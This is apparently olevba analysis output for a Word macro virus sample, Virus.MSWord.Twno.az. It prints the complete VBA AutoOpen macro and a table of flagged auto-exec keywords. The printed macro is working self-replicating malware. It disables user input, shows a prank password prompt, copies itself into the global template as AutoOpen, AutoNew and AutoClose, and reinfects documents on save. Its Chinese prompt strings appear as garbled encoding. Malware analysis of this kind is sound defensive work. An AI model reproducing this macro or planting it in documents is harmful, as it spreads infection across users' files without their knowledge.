olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.az
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.az - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.az - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim test
Dim con
Dim i
Dim ans$
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 32 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
test = -1
con = 1
i = 0

        While test = -1

            ans$ = WordBasic.[InputBox$]("ÎĘĚâ:" + Chr(13) + _
"Çë°Ń" + Chr(-24144) + "ÖĄÂé,ÖĄÂé,żŞĂĹ°É!" + Chr(-24143) + "Őâľä»°ŇëłÉÓ˘Óď!", "Í¬ĽĂŇ»şĹşę˛ˇ¶ľ")
            If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "panacea" Then
            GoTo exit_
            End If
            If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "Sesame, sesame, open the door!" Then
            WordBasic.MsgBox "·ÇłŁŐýČ·ŁˇÄăÍŃĎŐÁËŁˇ", "Í¬ĽĂŇ»şĹşę˛ˇ¶ľ"
            GoTo exit_
            Else
            WordBasic.CenterPara
            WordBasic.FormatFont Points:=16, Bold:=1, Underline:=1
            WordBasic.Insert "WRONG! "
            GoTo try
            End If

        Wend
            End If

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
    WordBasic.MacroCopy filem$, "AutoNew"
    WordBasic.MacroCopy filem$, "AutoClose"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", filem$
End If

    

exit_:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

